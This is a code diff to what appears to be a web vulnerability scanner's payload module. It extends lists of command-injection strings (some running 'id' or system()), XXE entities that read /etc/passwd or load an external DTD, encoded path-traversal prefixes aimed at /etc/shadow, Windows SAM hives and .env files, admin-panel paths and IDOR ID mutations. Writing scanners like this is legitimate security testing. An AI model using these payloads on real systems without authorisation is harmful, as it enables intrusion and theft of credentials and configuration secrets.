@@ -1,6 +1,7 @@
-"""Nuclei template patterns — RCE, XXE, Path Traversal, BAC, IDOR tespiti."""
+"""Nuclei template patterns — RCE, XXE, Path Traversal, BAC, IDOR tespiti.
+Commix (RCE), DotDotPwn (Path), XSSer (XSS) inspired enhancements."""
 
-# Nuclei: generic command injection (safe echo markers)
+# Commix-inspired command injection payloads (safe echo markers)
 RCE_PAYLOADS = [
     "; echo VEXRCEMARKER",
     "| echo VEXRCEMARKER",
@@ -65,6 +66,29 @@ RCE_PAYLOADS = [
     "| ping -c 1 127.0.0.1",
     "& ping -n 1 127.0.0.1",
     "; ping -n 1 127.0.0.1",
+    # Commix inspired additions
+    "%0aecho VEXRCEMARKER",
+    "%0decho VEXRCEMARKER",
+    "%0a%0decho VEXRCEMARKER",
+    ";echo${IFS}VEXRCEMARKER",
+    "|echo${IFS}VEXRCEMARKER",
+    "${IFS}echo${IFS}VEXRCEMARKER",
+    "$(echo${IFS}VEXRCEMARKER)",
+    "`echo${IFS}VEXRCEMARKER`",
+    "1%0aecho VEXRCEMARKER",
+    "1;id;1",
+    "1|id|1",
+    "1||id||1",
+    "1&&id&&1",
+    "${@echo,VEXRCEMARKER}",
+    "${@id,}",
+    "<%= id %>",
+    "<?php echo id(); ?>",
+    "{${system('echo VEXRCEMARKER')}}",
+    "{ ${system('echo VEXRCEMARKER')} }",
+    "{ ${system('id')} }",
+    "${system('echo VEXRCEMARKER')}",
+    "`${echo,\"VEXRCEMARKER\"}`",
 ]
 
 RCE_INDICATORS = [
@@ -79,9 +103,15 @@ RCE_INDICATORS = [
     "Windows",
     "49",  # {{7*7}} SSTI
     "7777777",
+    "Microsoft Windows",
+    "Windows NT",
+    "root:",
+    "daemon:",
+    "bin:",
+    "sys:",
 ]
 
-# Nuclei: XXE patterns
+# Nuclei: XXE patterns (Enhanced)
 XXE_PAYLOADS = [
     '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>''',
     '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>''',
@@ -98,6 +128,9 @@ XXE_PAYLOADS = [
     '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>''',
     '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/version">]><foo>&xxe;</foo>''',
     '''<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>''',
+    # XXE Bypass additions
+    '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://127.0.0.1/evil.dtd"> %xxe;]><foo>&exfil;</foo>''',
+    '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"><!ENTITY % d SYSTEM "http://127.0.0.1/evil.dtd"> %d; %param1; %param2;]>''',
 ]
 
 XXE_INDICATORS = [
@@ -114,18 +147,25 @@ XXE_INDICATORS = [
     "Linux version",
     "PATH=",
     "HOME=",
+    "DB_NAME",
+    "DB_USER",
+    "DB_PASS",
 ]
 
-# Nuclei: path traversal / LFI
+# DotDotPwn-inspired path traversal / LFI payloads
 TRAVERSAL_FILES = [
     "/etc/passwd", "/etc/hosts", "/etc/hostname", "/etc/shadow", "/etc/group",
     "/proc/self/environ", "/proc/self/cmdline", "/proc/self/status", "/proc/version",
     "/proc/cpuinfo", "/proc/meminfo", "/proc/net/arp", "/proc/net/tcp",
     "/var/log/apache2/access.log", "/var/log/nginx/access.log",
+    "/var/log/auth.log", "/var/log/syslog",
     "/windows/win.ini", "/windows/system32/drivers/etc/hosts",
+    "/windows/system32/config/SAM", "/windows/system32/config/SYSTEM",
     "c:/windows/win.ini", "c:/windows/system32/drivers/etc/hosts",
     "/etc/apache2/apache2.conf", "/etc/nginx/nginx.conf", "/etc/mysql/my.cnf",
     "/.env", "/config/database.yml", "/wp-config.php", "/WEB-INF/web.xml",
+    "/WEB-INF/classes", "/application.properties", "/application.yml",
+    "/appsettings.json", "/web.config",
 ]
 
 TRAVERSAL_PREFIXES = [
@@ -134,18 +174,41 @@ TRAVERSAL_PREFIXES = [
     "..//", "..\\\\", ".%2e/", "%2e./", "..././", "...\\.\\",
     "/%5c%2e%2e/", "/%2e%2e%2f", "/..%2f..%2f", "/..%5c..%5c",
     "..%00/", "..%0d/", "..%0a/",
+    # DotDotPwn additions
+    "%252e%252e%252f", "%252e%252e%255c",
+    "%c0%ae%c0%ae%c0%af", "%c0%ae%c0%ae%c1%9c",
+    "%e0%80%ae%e0%80%ae%e0%80%af", "%e0%80%ae%e0%80%ae%c1%9c",
+    "%f0%80%80%ae%f0%80%80%ae%f0%80%80%af",
+    "..%0a/", "..%0d%0a/", "..%09/", "..%0b/", "..%0c/",
+    "..%1a/", "..%1c/", "..%1d/", "..%1e/", "..%1f/",
+    "/..", "\\..",
 ]
 
 def gen_path_traversal_payloads():
     seen = set()
     for prefix in TRAVERSAL_PREFIXES:
-        for depth in range(1, 9):
+        for depth in range(1, 12):  # Depth extended to 12
             traversal = prefix * depth
             for target in TRAVERSAL_FILES:
                 for payload in [traversal + target, traversal + target.lstrip('/'), target]:
                     if payload not in seen:
                         seen.add(payload)
                         yield payload
+    # Also add WAF bypass variations using waf.py's TRAVERSAL_BYPASS_TECHNIQUES
+    from .waf import TRAVERSAL_BYPASS_TECHNIQUES
+    for prefix in TRAVERSAL_PREFIXES[:5]:
+        for depth in range(1, 6):
+            traversal = prefix * depth
+            for target in TRAVERSAL_FILES[:5]:
+                base = traversal + target
+                for tech in TRAVERSAL_BYPASS_TECHNIQUES:
+                    try:
+                        v = tech(base)
+                        if v not in seen:
+                            seen.add(v)
+                            yield v
+                    except:
+                        continue
 
 PATH_INDICATORS = [
     "root:x:0:0:", "daemon:", "bin:", "sys:", "www-data:", "nobody:",
@@ -154,9 +217,10 @@ PATH_INDICATORS = [
     "SECRET_KEY", "mysql:", "postgresql:", "redis:", "mongodb:",
     "Linux version", "processor", "MemTotal", "PATH=", "HOME=",
     "<?php", "define(", "web.xml", "servlet",
+    "spring:", "datasource:", "jdbc:", "sqlite:",
 ]
 
-# Nuclei: BAC / exposed admin panels
+# Nuclei: BAC / exposed admin panels (Enhanced)
 BAC_PATHS = [
     "/admin", "/administrator", "/admin.php", "/admin/login", "/admin/dashboard",
     "/admin/index.php", "/admin/home", "/admin/controlpanel", "/admin/cp",
@@ -192,6 +256,13 @@ BAC_PATHS = [
     "/administration/login.asp", "/administration/admin.asp",
     "/administration/account.asp", "/administration/login.aspx",
     "/administration/admin.aspx", "/administration/account.aspx",
+    # BAC additions
+    "/app/admin", "/site/admin", "/cms/admin",
+    "/backend.php", "/admin.php", "/administrator.php",
+    "/user-management", "/admin-panel",
+    "/api/v2/admin", "/api/admin/v1",
+    "/admin/config", "/admin/settings", "/admin/manage",
+    "/backup", "/backup.php", "/admin/backup",
 ]
 
 BAC_KEYWORDS = [
@@ -201,11 +272,12 @@ BAC_KEYWORDS = [
     "welcome admin", "admin area", "backend", "management console",
     "phpmyadmin", "database admin", "server status", "actuator",
     "swagger", "api documentation", "graphql playground",
+    "backup", "restore", "database", "config",
 ]
 
-BAC_SENSITIVE_HEADERS = ["x-admin", "x-debug", "x-powered-by"]
+BAC_SENSITIVE_HEADERS = ["x-admin", "x-debug", "x-powered-by", "x-envoy-upstream-service-time"]
 
-# Nuclei: IDOR patterns
+# Nuclei: IDOR patterns (Enhanced)
 IDOR_PARAM_HINTS = [
     'id', 'uid', 'user_id', 'userid', 'user', 'account', 'account_id',
     'accountid', 'profile', 'profile_id', 'order', 'order_id', 'orderid',
@@ -215,6 +287,8 @@ IDOR_PARAM_HINTS = [
     'message', 'message_id', 'ticket', 'ticket_id', 'report', 'report_id',
     'ref', 'reference', 'num', 'number', 'no', 'seq', 'sequence',
     'uuid', 'guid', 'token', 'key', 'hash', 'slug', 'name',
+    'customer', 'customer_id', 'client', 'client_id',
+    'owner', 'owner_id', 'creator', 'creator_id',
 ]
 
 IDOR_PATTERNS = [
@@ -224,26 +298,44 @@ IDOR_PATTERNS = [
     r'^account\d+$',
     r'^order\d+$',
     r'^[A-Za-z0-9]{8,32}$',
+    r'^\d+_\d+$',
+    r'^\d+-\d+$',
 ]
 
 def idor_test_values(original):
-    """Nuclei-style sequential ID mutation."""
+    """Nuclei-style sequential ID mutation (Enhanced)."""
     values = []
     s = str(original)
     if s.isdigit():
         n = int(s)
-        values.extend([n - 2, n - 1, n + 1, n + 2, 1, 0, 99999, n ^ 1])
+        values.extend([n - 3, n - 2, n - 1, n + 1, n + 2, n + 3, 1, 0, 99999, n ^ 1, n ^ 2, n | 1])
     elif s.startswith('user') and s[4:].isdigit():
         values.append(f"user{int(s[4:]) + 1}")
         values.append(f"user{int(s[4:]) - 1}")
+        values.append(f"user{int(s[4:]) + 2}")
+        values.append(f"user{int(s[4:]) - 2}")
+        values.append("user1")
     elif s.startswith('order') and s[5:].isdigit():
         values.append(f"order{int(s[5:]) + 1}")
+        values.append(f"order{int(s[5:]) - 1}")
+        values.append(f"order{int(s[5:]) + 2}")
+        values.append("order1")
     elif len(s) == 36 and '-' in s:
         parts = s.split('-')
         try:
             last = int(parts[-1], 16)
-            parts[-1] = format((last + 1) & 0xffffffff, '012x')[-12:]
-            values.append('-'.join(parts))
+            for delta in [-2, -1, 1, 2]:
+                new_last = format((last + delta) & 0xffffffff, '012x')[-12:]
+                new_parts = parts[:-1] + [new_last]
+                values.append('-'.join(new_parts))
         except ValueError:
             pass
+    elif '_' in s and len(s.split('_')) == 2:
+        a, b = s.split('_')
+        if a.isdigit() and b.isdigit():
+            na, nb = int(a), int(b)
+            values.append(f"{na+1}_{nb}")
+            values.append(f"{na-1}_{nb}")
+            values.append(f"{na}_{nb+1}")
+            values.append(f"{na}_{nb-1}")
     return [str(v) for v in values if str(v) != s]
